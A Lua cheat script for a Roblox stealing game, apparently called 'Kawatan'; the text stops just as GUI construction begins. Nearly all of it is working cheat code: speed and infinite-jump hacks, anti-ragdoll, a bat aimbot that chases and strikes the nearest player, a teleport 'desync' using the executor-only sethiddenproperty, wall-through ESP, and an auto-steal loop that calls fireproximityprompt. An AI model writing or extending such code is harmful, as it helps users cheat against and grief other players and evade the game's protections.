local Players       = game:GetService("Players")
local TweenService  = game:GetService("TweenService")
local UIS           = game:GetService("UserInputService")
local RunService    = game:GetService("RunService")
local HttpService   = game:GetService("HttpService")
local LP            = Players.LocalPlayer
local PlayerGui     = LP:WaitForChild("PlayerGui")

for _, n in ipairs({"KawatanVisual", "KawatanMobileVisual"}) do
    local old = PlayerGui:FindFirstChild(n)
    if old then old:Destroy() end
end

-- â”€â”€â”€ COLORS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local C = {
    bg        = Color3.fromRGB(12, 14, 18),
    panel     = Color3.fromRGB(18, 20, 26),
    row       = Color3.fromRGB(24, 26, 34),
    accent    = Color3.fromRGB(0, 170, 255),
    accentDim = Color3.fromRGB(0, 120, 200),
    text      = Color3.fromRGB(0, 170, 255),
    textDim   = Color3.fromRGB(80, 160, 220),
    stroke    = Color3.fromRGB(45, 50, 65),
    offTrack  = Color3.fromRGB(50, 54, 65),
    onTrack   = Color3.fromRGB(0, 170, 255),
    dark      = Color3.fromRGB(22, 24, 32),
    white     = Color3.fromRGB(255, 255, 255),
}

-- â”€â”€â”€ HELPERS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function corner(obj, r)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = obj; return c
end
local function stroke(obj, col, thick, trans)
    local s = Instance.new("UIStroke"); s.Color = col or C.stroke; s.Thickness = thick or 1
    s.Transparency = trans or 0.3; s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Parent = obj; return s
end
local function tw(obj, props, t)
    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end
local function getChar() return LP.Character end
local function getHRP() local c=getChar(); return c and c:FindFirstChild("HumanoidRootPart") end
local function getHum() local c=getChar(); return c and c:FindFirstChildOfClass("Humanoid") end

-- â”€â”€â”€ STATE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local NS, CS            = 59, 29
local LAGGER_SPEED      = 30
local LAGGER_CARRY      = 15
local carryActive       = false
local laggerActive      = false
local infJumpEnabled    = false
local antiRagEnabled    = false
local autoLeftEnabled   = false
local autoRightEnabled  = false
local autoBatEnabled    = false
local espEnabled        = false
local autoStealEnabled  = false
local uiScaleValue      = 0.70
local mobileScaleValue  = 1.00
local buttonShape       = "CIRCLE"  -- SQUARE | CIRCLE
local logoVisible       = true
local logoIndex         = 1
local LOGO_URLS = {
    "https://files.catbox.moe/g3g6iq.png",
    "https://files.catbox.moe/itmh5x.png",
}
local uiLocked = false
markConfigDirty = function() end
_configReady = false
_configDirty = false

-- auto-path waypoints (exact from Void)
local AP_L1 = Vector3.new(-476.47,-6.28,92.73)
local AP_L2 = Vector3.new(-483.12,-4.95,94.81)
local AP_R1 = Vector3.new(-476.16,-6.52,25.62)
local AP_R2 = Vector3.new(-483.06,-5.03,25.48)

local alConn, arConn, alPhase, arPhase = nil, nil, 1, 1
local aimbotConn, holdInfJumpConn, antiRagConn = nil, nil, nil
local Conns = {}

local UIState = {
    antiDie = false,
    antiFling = false,
    safeMode = false,
    batCounter = false,
    medusaCounter = false,
    ragdollSteal = false,
    noCamCol = false,
    fovChange = false,
    antiLag = false,
    potato = false,
    darkMode = false,
    headless = false,
}

local ESP   = { conns={}, labels={}, folder=nil }

-- mobile button visual setters (filled after build)
local mobBtnRefs = {}

-- â”€â”€â”€ SPEED HELPERS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function isRagdollState(hum)
    if not hum then return true end
    local st = hum:GetState()
    return hum.PlatformStand
        or st == Enum.HumanoidStateType.Physics
        or st == Enum.HumanoidStateType.Ragdoll
        or st == Enum.HumanoidStateType.FallingDown
end

local function getActiveMoveSpeed()
    if laggerActive then return carryActive and LAGGER_CARRY or LAGGER_SPEED end
    return carryActive and CS or NS
end

local function applySpeed()
    local hum = getHum(); if not hum then return end
    hum.WalkSpeed = getActiveMoveSpeed()
end

-- â”€â”€â”€ INF JUMP (exact Void velocity method) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function startHoldInfJump()
    if holdInfJumpConn then holdInfJumpConn:Disconnect() end
    holdInfJumpConn = RunService.Heartbeat:Connect(function()
        if not infJumpEnabled then return end
        local char = LP.Character; if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum  = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        local held = UIS:IsKeyDown(Enum.KeyCode.Space) or hum.Jump
        if held and root.Velocity.Y < 35 then
            root.Velocity = Vector3.new(root.Velocity.X, 55, root.Velocity.Z)
        end
        if root.Velocity.Y < -120 then
            root.Velocity = Vector3.new(root.Velocity.X, -120, root.Velocity.Z)
        end
    end)
end
local function stopHoldInfJump()
    if holdInfJumpConn then holdInfJumpConn:Disconnect(); holdInfJumpConn=nil end
end

-- â”€â”€â”€ ANTI RAGDOLL (exact Void bone-destruction method) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function startAntiRagdoll()
    if Conns.antiRag then return end
    Conns.antiRag = RunService.Heartbeat:Connect(function()
        if not antiRagEnabled then return end
        local c   = LP.Character; if not c then return end
        local hum  = c:FindFirstChildOfClass("Humanoid")
        local root = c:FindFirstChild("HumanoidRootPart")
        if not (hum and root) then return end
        local s = hum:GetState()
        local ragdolled = (s == Enum.HumanoidStateType.Physics
            or s == Enum.HumanoidStateType.Ragdoll
            or s == Enum.HumanoidStateType.FallingDown)
        local endTime = LP:GetAttribute("RagdollEndTime")
        if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then ragdolled = true end
        if ragdolled then
            pcall(function() LP:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow()) end)
            for _, d in ipairs(c:GetDescendants()) do
                if d:IsA("BallSocketConstraint")
                    or (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
                    d:Destroy()
                end
            end
            for _, obj in ipairs(c:GetDescendants()) do
                if obj:IsA("Motor6D") and obj.Enabled == false then obj.Enabled = true end
            end
            if hum.Health > 0 then hum:ChangeState(Enum.HumanoidStateType.Running) end
            workspace.CurrentCamera.CameraSubject = hum
            root.Anchored = false
            root.AssemblyLinearVelocity   = Vector3.zero
            root.AssemblyAngularVelocity  = Vector3.zero
        end
    end)
end
local function stopAntiRagdoll()
    if Conns.antiRag then Conns.antiRag:Disconnect(); Conns.antiRag = nil end
end

-- â”€â”€â”€ BAT FINDER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function findBat()
    local char = LP.Character; if not char then return nil end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
    end
    local bp = LP:FindFirstChild("Backpack")
    if bp then for _, tool in ipairs(bp:GetChildren()) do
        if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
    end end
    return nil
end

local function swingCurrentBat()
    local char = LP.Character; if not char then return end
    local hum  = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
    local bat  = findBat()
    if bat then
        if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
        pcall(function() bat:Activate() end)
    end
end

-- â”€â”€â”€ CLOSEST TARGET â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function getClosestTarget()
    local root = getHRP(); if not root then return nil end
    local closest, bestDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then
            local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hrp and hum and hum.Health > 0 then
                local dist = (hrp.Position - root.Position).Magnitude
                if dist < bestDist then bestDist = dist; closest = hrp end
            end
        end
    end
    return closest
end

-- â”€â”€â”€ BAT AIMBOT (exact Void RenderStepped predict+chase) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function startBatAimbot()
    if aimbotConn then aimbotConn:Disconnect() end
    autoBatEnabled = true
    if autoLeftEnabled then autoLeftEnabled=false; if alConn then alConn:Disconnect(); alConn=nil end end
    if autoRightEnabled then autoRightEnabled=false; if arConn then arConn:Disconnect(); arConn=nil end end
    local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then hum0.AutoRotate = false end

    aimbotConn = RunService.RenderStepped:Connect(function()
        if not autoBatEnabled then return end
        local c    = LP.Character; if not c then return end
        local root = c:FindFirstChild("HumanoidRootPart"); if not root then return end
        local hum  = c:FindFirstChildOfClass("Humanoid"); if not hum then return end
        if not c:FindFirstChildOfClass("Tool") then
            local bat = findBat(); if bat then pcall(function() hum:EquipTool(bat) end) end
        end
        local target = getClosestTarget()
        if not target then swingCurrentBat(); return end
        local targetVel = target.AssemblyLinearVelocity
        local myPos     = root.Position
        local targetPos = target.Position
        local predictPos = targetPos + targetVel*0.14 + target.CFrame.LookVector*0.3
        local direction  = predictPos - myPos
        local flatDir    = Vector3.new(direction.X, 0, direction.Z)
        if flatDir.Magnitude < 0.05 then
            flatDir = root.CFrame.LookVector
        else
            flatDir = flatDir.Unit
        end
        local chaseSpeed   = 58
        local desiredHeight = targetPos.Y + 3.7
        local yVel = (desiredHeight - myPos.Y)*19.5 + targetVel.Y*0.8
        if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
        yVel = math.clamp(yVel, -70, 110)
        local desiredVel = Vector3.new(flatDir.X*chaseSpeed, yVel, flatDir.Z*chaseSpeed)
        root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
        local speed3      = targetVel.Magnitude
        local predictTime = math.clamp(speed3/150, 0.05, 0.2)
        local predictedPos = targetPos + targetVel*predictTime
        local toPredict    = predictedPos - myPos
        if toPredict.Magnitude > 0.1 then
            local goalCF = CFrame.lookAt(myPos, predictedPos)
            local curCF  = root.CFrame
            local diffCF = curCF:Inverse() * goalCF
            local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
            rx = math.clamp(rx,-2.5,2.5); ry = math.clamp(ry,-2.5,2.5); rz = math.clamp(rz,-2.5,2.5)
            local tiltSpeed = 42
            root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx*tiltSpeed,ry*tiltSpeed,rz*tiltSpeed))
        end
        swingCurrentBat()
    end)
    if mobBtnRefs.aimbot then mobBtnRefs.aimbot(true) end
end

local function stopBatAimbot()
    if aimbotConn then aimbotConn:Disconnect(); aimbotConn=nil end
    autoBatEnabled = false
    local char = LP.Character; local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then root.AssemblyLinearVelocity=Vector3.zero; root.AssemblyAngularVelocity=Vector3.zero end
    local hum = char and char:FindFirstChildOfClass("Humanoid"); if hum then hum.AutoRotate=true end
    if mobBtnRefs.aimbot then mobBtnRefs.aimbot(false) end
end

-- â”€â”€â”€ TP BAT / DESYNC (CZ-style continuous) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local tpBatEnabled = false
local tpBatHitting = false
local tpBatConn = nil

local function getBatTool()
    local char = LP.Character
    if not char then return nil end
    local tool = char:FindFirstChild("Bat")
    if tool then return tool end
    for _, t in ipairs(char:GetChildren()) do
        if t:IsA("Tool") and (t.Name:lower():find("bat") or t.Name:lower():find("slap")) then return t end
    end
    local bp = LP:FindFirstChild("Backpack")
    if bp then
        tool = bp:FindFirstChild("Bat")
        if tool then tool.Parent = char; return tool end
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") and (t.Name:lower():find("bat") or t.Name:lower():find("slap")) then
                t.Parent = char; return t
            end
        end
    end
    return nil
end

local function executeBatHit()
    if tpBatHitting then return end
    tpBatHitting = true
    pcall(function()
        local bat = getBatTool()
        if bat then
            bat:Activate()
            local remote = bat:FindFirstChildWhichIsA("RemoteEvent")
            if remote then remote:FireServer() end
        end
    end)
    task.delay(0.08, function() tpBatHitting = false end)
end

local function startTPBat()
    if tpBatConn then tpBatConn:Disconnect() end
    tpBatEnabled = true
    -- stop normal aimbot if running to avoid fight
    if autoBatEnabled then stopBatAimbot() end
    tpBatConn = RunService.Heartbeat:Connect(function()
        if not tpBatEnabled then return end
        local hrp = getHRP()
        local hum = getHum()
        if not hrp or not hum then return end
        local target = getClosestTarget()
        if not target then return end
        -- CZ desync: bind physics rep + snap when far + look + hit
        pcall(function()
            if sethiddenproperty then
                sethiddenproperty(hrp, "PhysicsRepRootPart", target)
            end
        end)
        local targetPosition = target.Position + Vector3.new(0, 0.9, 0)
        if (hrp.Position - targetPosition).Magnitude > 8 then
            hrp.CFrame = CFrame.new(targetPosition)
        end
        local camera = workspace.CurrentCamera
        if camera then
            camera.CFrame = CFrame.new(camera.CFrame.Position, target.Position)
        end
        executeBatHit()
    end)
    if mobBtnRefs.tpBat then mobBtnRefs.tpBat(true) end
end

local function stopTPBat()
    tpBatEnabled = false
    if tpBatConn then tpBatConn:Disconnect(); tpBatConn = nil end
    if mobBtnRefs.tpBat then mobBtnRefs.tpBat(false) end
end

local function toggleTPBat()
    if tpBatEnabled then stopTPBat() else startTPBat() end
end

-- â”€â”€â”€ AUTO PATH (exact Void two-waypoint phase system) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function getAutoPathSpeed()
    return getActiveMoveSpeed()
end

local function stopAutoLeft()
    if alConn then alConn:Disconnect(); alConn=nil end; alPhase=1
    local c=LP.Character; if c then local h=c:FindFirstChildOfClass("Humanoid"); if h then h:Move(Vector3.zero,false) end end
    if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
end

local function stopAutoRight()
    if arConn then arConn:Disconnect(); arConn=nil end; arPhase=1
    local c=LP.Character; if c then local h=c:FindFirstChildOfClass("Humanoid"); if h then h:Move(Vector3.zero,false) end end
    if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
end

local function startAutoLeft()
    if alConn then alConn:Disconnect() end; alPhase=1
    alConn = RunService.Heartbeat:Connect(function()
        if not autoLeftEnabled then return end
        local char=LP.Character; if not char then return end
        local hrp=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        if isRagdollState(hum) then hum:Move(Vector3.zero,false); return end
        local spd=getAutoPathSpeed()
        if alPhase==1 then
            local tgt=Vector3.new(AP_L1.X,hrp.Position.Y,AP_L1.Z)
            if (tgt-hrp.Position).Magnitude<1 then
                alPhase=2; local d=AP_L2-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
                hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd); return
            end
            local d=AP_L1-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
            hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd)
        elseif alPhase==2 then
            local tgt=Vector3.new(AP_L2.X,hrp.Position.Y,AP_L2.Z)
            if (tgt-hrp.Position).Magnitude<1 then
                hum:Move(Vector3.zero,false); hrp.Velocity=Vector3.zero
                autoLeftEnabled=false; if alConn then alConn:Disconnect(); alConn=nil end; alPhase=1
                if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end; return
            end
            local d=AP_L2-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
            hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd)
        end
    end)
end

local function startAutoRight()
    if arConn then arConn:Disconnect() end; arPhase=1
    arConn = RunService.Heartbeat:Connect(function()
        if not autoRightEnabled then return end
        local char=LP.Character; if not char then return end
        local hrp=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        if isRagdollState(hum) then hum:Move(Vector3.zero,false); return end
        local spd=getAutoPathSpeed()
        if arPhase==1 then
            local tgt=Vector3.new(AP_R1.X,hrp.Position.Y,AP_R1.Z)
            if (tgt-hrp.Position).Magnitude<1 then
                arPhase=2; local d=AP_R2-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
                hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd); return
            end
            local d=AP_R1-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
            hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd)
        elseif arPhase==2 then
            local tgt=Vector3.new(AP_R2.X,hrp.Position.Y,AP_R2.Z)
            if (tgt-hrp.Position).Magnitude<1 then
                hum:Move(Vector3.zero,false); hrp.Velocity=Vector3.zero
                autoRightEnabled=false; if arConn then arConn:Disconnect(); arConn=nil end; arPhase=1
                if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end; return
            end
            local d=AP_R2-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
            hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd)
        end
    end)
end

-- â”€â”€â”€ DROP BRAINROT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local dropActive = false
local function runDrop()
    if dropActive then return end
    local char=LP.Character; if not char then return end
    local root=char:FindFirstChild("HumanoidRootPart"); if not root then return end
    dropActive=true
    local t0=tick(); local dc
    dc=RunService.Heartbeat:Connect(function()
        local r=char and char:FindFirstChild("HumanoidRootPart")
        if not r then if dc then dc:Disconnect() end; dropActive=false; return end
        if tick()-t0 >= 0.2 then
            dc:Disconnect()
            local rp=RaycastParams.new(); rp.FilterDescendantsInstances={char}; rp.FilterType=Enum.RaycastFilterType.Exclude
            local rr=workspace:Raycast(r.Position,Vector3.new(0,-2000,0),rp)
            if rr then
                local hum2=char:FindFirstChildOfClass("Humanoid")
                local off=(hum2 and hum2.HipHeight or 2)+(r.Size.Y/2)
                r.CFrame=CFrame.new(r.Position.X,rr.Position.Y+off,r.Position.Z)
                pcall(function() r.AssemblyLinearVelocity=Vector3.zero; r.Velocity=Vector3.zero end)
            end
            dropActive=false; return
        end
        pcall(function() r.Velocity=Vector3.new(r.Velocity.X,60,r.Velocity.Z) end)
    end)
end

-- â”€â”€â”€ TP FLOOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function runTPFloor()
    local hrp=getHRP(); if not hrp then return end
    local char=LP.Character
    local rp=RaycastParams.new(); rp.FilterDescendantsInstances={char}; rp.FilterType=Enum.RaycastFilterType.Exclude
    local rr=workspace:Raycast(hrp.Position,Vector3.new(0,-500,0),rp)
    if rr then
        local hum=getHum(); local off=(hum and hum.HipHeight or 2)+(hrp.Size.Y/2)
        hrp.CFrame=CFrame.new(hrp.Position.X,rr.Position.Y+off,hrp.Position.Z)
        pcall(function() hrp.AssemblyLinearVelocity=Vector3.zero end)
    end
end

-- â”€â”€â”€ INSTA RESET â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local function doInstaReset()
    local hum=getHum(); if hum then hum.Health=0 end
end

-- â”€â”€â”€ ESP (exact Void: speed counter + avatar circle + highlight + line) â”€â”€â”€â”€â”€â”€â”€
local function espClear()
    for _,cn in pairs(ESP.conns) do pcall(function() cn:Disconnect() end) end
    ESP.conns={}
    for _,data in pairs(ESP.labels) do
        pcall(function() if data.billboard then data.billboard:Destroy() end end)
        pcall(function() if data.avBb then data.avBb:Destroy() end end)
        pcall(function() if data.highlight then data.highlight:Destroy() end end)
        pcall(function() if data.line then data.line:Destroy() end end)
    end
    ESP.labels={}
    if ESP.folder then pcall(function() ESP.folder:Destroy() end); ESP.folder=nil end
end

local function espMakeLabel(plr)
    if not plr then return end
    -- remove old
    local old=ESP.labels[plr]
    if old then
        pcall(function() if old.billboard then old.billboard:Destroy() end end)
        pcall(function() if old.avBb then old.avBb:Destroy() end end)
        pcall(function() if old.highlight then old.highlight:Destroy() end end)
        pcall(function() if old.line then old.line:Destroy() end end)
        ESP.labels[plr]=nil
    end
    local char=plr.Character; if not char then return end
    local head=char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart"); if not head then return end
    local isLocal=(plr==LP)

        local avBb=nil

    -- SPEED BILLBOARD
    local bb=Instance.new("BillboardGui")
    bb.Name="KawESPSpeed"; bb.AlwaysOnTop=true
    bb.Size=UDim2.new(0,200,0,44); bb.StudsOffset=Vector3.new(0,isLocal and 3 or 3.6,0)
    bb.MaxDistance=2000; bb.Parent=head
    local speedLbl=Instance.new("TextLabel",bb)
    speedLbl.Size=UDim2.new(1,0,1,0); speedLbl.BackgroundTransparency=1
    speedLbl.Text="Speed: 0"; speedLbl.Font=Enum.Font.GothamBlack; speedLbl.TextSize=22
    speedLbl.TextColor3=Color3.fromRGB(0, 170, 255)
    speedLbl.TextStrokeTransparency=0.2; speedLbl.TextStrokeColor3=Color3.fromRGB(0,0,0)

    -- HIGHLIGHT + LINE (others only)
    local hl, linePart=nil,nil
    if not isLocal then
        hl=Instance.new("Highlight"); hl.Name="KawChams"; hl.Adornee=char
        hl.FillColor=Color3.fromRGB(0, 170, 255); hl.FillTransparency=0.7
        hl.OutlineColor=Color3.fromRGB(0, 170, 255); hl.OutlineTransparency=0
        hl.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop
        pcall(function() hl.Parent=ESP.folder or workspace end)

        linePart=Instance.new("Part"); linePart.Name="KawESPLine"
        linePart.Anchored=true; linePart.CanCollide=false; linePart.CanQuery=false
        linePart.CanTouch=false; linePart.CastShadow=false
        linePart.Material=Enum.Material.Neon; linePart.Color=Color3.fromRGB(0, 170, 255)
        linePart.Transparency=0.2; linePart.Size=Vector3.new(0.05,0.05,1)
        pcall(function() linePart.Parent=ESP.folder or workspace end)

        local lineConn=RunService.RenderStepped:Connect(function()
            if not espEnabled then return end
            local myHRP=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            local tHRP=char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head"))
            if not myHRP or not tHRP or not linePart or not linePart.Parent then return end
            local a=myHRP.Position; local b=tHRP.Position; local dist=(b-a).Magnitude
            linePart.Size=Vector3.new(0.05,0.05,dist); linePart.CFrame=CFrame.lookAt((a+b)/2,b)
        end)
        table.insert(ESP.conns,lineConn)
    end

    -- LIVE SPEED UPDATE (horizontal studs/s â€” exact Void formula)
    local speedConn=RunService.RenderStepped:Connect(function()
        if not espEnabled or not speedLbl or not speedLbl.Parent then return end
        local c=plr.Character; local hrp=c and c:FindFirstChild("HumanoidRootPart")
        local hum=c and c:FindFirstChildOfClass("Humanoid")
        if not hrp then speedLbl.Text="Speed: 0"; return end
        local v=hrp.AssemblyLinearVelocity
        local spd=math.sqrt(v.X*v.X+v.Z*v.Z) -- horizontal only
        if isLocal and hum and not isRagdollState(hum) then
            local md=hum.MoveDirection
            if md.Magnitude>0.05 and not autoBatEnabled and not autoLeftEnabled and not autoRightEnabled then
                local target=getActiveMoveSpeed()
                if type(target)=="number" and target>0 and spd>target*0.55 then spd=target end
            end
        end
        speedLbl.Text=string.format("Speed: %d", math.floor(spd+0.5))
    end)
    table.insert(ESP.conns, speedConn)

    ESP.labels[plr]={billboard=bb, avBb=avBb, highlight=hl, line=linePart}
end

local function startESP()
    espEnabled=true; espClear()
    ESP.folder=Instance.new("Folder"); ESP.folder.Name="KawESPFolder"
    pcall(function() ESP.folder.Parent=workspace end)
    for _,plr in ipairs(Players:GetPlayers()) do
        espMakeLabel(plr)
        table.insert(ESP.conns, plr.CharacterAdded:Connect(function()
            task.wait(0.4); if espEnabled then espMakeLabel(plr) end
        end))
    end
    table.insert(ESP.conns, Players.PlayerAdded:Connect(function(plr)
        if not espEnabled then return end
        table.insert(ESP.conns, plr.CharacterAdded:Connect(function()
            task.wait(0.4); if espEnabled then espMakeLabel(plr) end
        end))
        if plr.Character then espMakeLabel(plr) end
    end))
    table.insert(ESP.conns, Players.PlayerRemoving:Connect(function(plr)
        local data=ESP.labels[plr]
        if data then
            pcall(function() if data.billboard then data.billboard:Destroy() end end)
            pcall(function() if data.avBb then data.avBb:Destroy() end end)
            pcall(function() if data.highlight then data.highlight:Destroy() end end)
            pcall(function() if data.line then data.line:Destroy() end end)
            ESP.labels[plr]=nil
        end
    end))
end

local function stopESP()
    espEnabled=false; espClear()
    pcall(function()
        for _,obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BillboardGui") and obj.Name:find("KawESP") then obj:Destroy() end
            if obj:IsA("Highlight") and obj.Name=="KawChams" then obj:Destroy() end
            if obj:IsA("Part") and obj.Name=="KawESPLine" then obj:Destroy() end
        end
    end)
end

-- â”€â”€â”€ AUTO STEAL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local autoStealConn=nil
local function startAutoSteal()
    if autoStealConn then autoStealConn:Disconnect(); autoStealConn=nil end
    autoStealConn=RunService.Heartbeat:Connect(function()
        if not autoStealEnabled then return end
        local hrp=getHRP(); if not hrp then return end
        for _,obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("ProximityPrompt") and obj.Enabled
                and obj.ActionText and obj.ActionText:find("Steal") then
                local att=obj.Parent
                if att and att:IsA("Attachment") then
                    local base=att.Parent
                    if base and base:IsA("BasePart") then
                        if (base.Position-hrp.Position).Magnitude < 60 then
                            pcall(function() fireproximityprompt(obj) end)
                        end
                    end
                end
            end
        end
    end)
end
local function stopAutoSteal()
    if autoStealConn then autoStealConn:Disconnect(); autoStealConn=nil end
end

-- â”€â”€â”€ GUI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
local gui = Instance.new("ScreenGui")
gui.Name="KawatanVisual"; gui.ResetOnSpawn=false; gui.IgnoreGuiInset=true
gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; gui.DisplayOrder=50; gui.Parent=PlayerGui

local main=Instance.new("Frame")
